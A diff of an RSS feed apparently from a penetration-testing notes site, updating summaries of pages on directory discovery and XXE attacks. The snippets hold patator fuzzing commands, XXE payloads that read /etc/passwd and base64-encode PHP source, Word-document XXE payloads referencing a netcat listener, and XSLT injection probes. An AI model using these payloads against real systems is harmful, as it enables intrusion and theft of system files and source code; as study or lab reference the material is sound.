@@ -36,9 +36,9 @@ MIME Type # Classical, using Burp for example Content-Type: application/x-php â†
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-attacks/files-inclusions-and-injections/directory_file_discovery/</guid>
-      <description> Test for directory traversal  
+      <description>Test for directory traversal  
 General &amp;amp; Tricks # Check for .git # If there is a git, possible to download the source code # Check for temp saved files # Vim creates .swp files index.php/.admin.html.swp # Path traversal cheat sheet https://www.gracefulsecurity.com/path-traversal-cheat-sheet-linux/ 
-Patator # Fuzzing patator http_fuzz url=http://10.10.10.150/FILE0 0=wordlist.txt -x ignore:code=400 -x ignore:code=404 # Auth basic patator http_fuzz url=https://IP/FILE0 0=.wordlisttxt -x ignore:code=400 -x ignore:code=404 header=&amp;#39;Authorization: Basic YOUR_BASE64_HERE&amp;#39;</description>
+Patator # Fuzzing patator http_fuzz url=http://10.10.10.150/FILE0 0=wordlist.txt -x ignore:code=400 -x ignore:code=404 # Auth basic patator http_fuzz url=https://IP/FILE0 0=.wordlisttxt -x ignore:code=400 -x ignore:code=404 header=&amp;#39;Authorization: Basic YOUR_BASE64_HERE&amp;#39; # Admin wordlist patator http_fuzz url=&amp;#39;url/FILE0&amp;#39; 0=wordlist/admin.</description>
     </item>
     
     <item>
@@ -49,7 +49,7 @@ Patator # Fuzzing patator http_fuzz url=http://10.10.10.150/FILE0 0=wordlist.txt
       <guid>/web-attacks/files-inclusions-and-injections/xxe/</guid>
       <description>Resources https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf 
 Basic XXE &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;php://filter/read=convert.base64-encode/resource=path/index.php&amp;#34; &amp;gt; ]&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34; &amp;gt; ]&amp;gt;&amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt;# XXE via Word: &amp;lt;!-- word/document.xml --&amp;gt; &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34; standalone=&amp;#34;yes&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % pe SYSTEM &amp;#34;nc -nlvp 31337&amp;#34;&amp;gt; %pe; ]&amp;gt; &amp;lt;foo&amp;gt;&amp;amp;external;&amp;lt;/foo&amp;gt; &amp;lt;!-- word/document.xml --&amp;gt; &amp;lt;!DOCTYPE r [ &amp;lt;!ELEMENT r ANY &amp;gt; &amp;lt;!ENTITY sp SYSTEM &amp;#34;nc -nlvp 31337&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;r&amp;gt;&amp;amp;sp;&amp;lt;/r&amp;gt; 
-XSLT Injection # You can execute commands through an external XML file &amp;lt;br /&amp;gt;Version: &amp;lt;xsl:value-of select=&amp;#34;system-property(&amp;#39;xsl:version&amp;#39;)&amp;#34; /&amp;gt; &amp;lt;br /&amp;gt;Vendor: &amp;lt;xsl:value-of select=&amp;#34;system-property(&amp;#39;xsl:vendor&amp;#39;)&amp;#34; /&amp;gt; &amp;lt;br /&amp;gt;Vendor URL: &amp;lt;xsl:value-of select=&amp;#34;system-property(&amp;#39;xsl:vendor-url&amp;#39;)&amp;#34; /&amp;gt; # Example &amp;lt;?</description>
+Out of Band XXE (OOB XXE) # The exploitation will download a remote DTD file # And then execute entities # SVG File &amp;lt;!</description>
     </item>
     
   </channel>
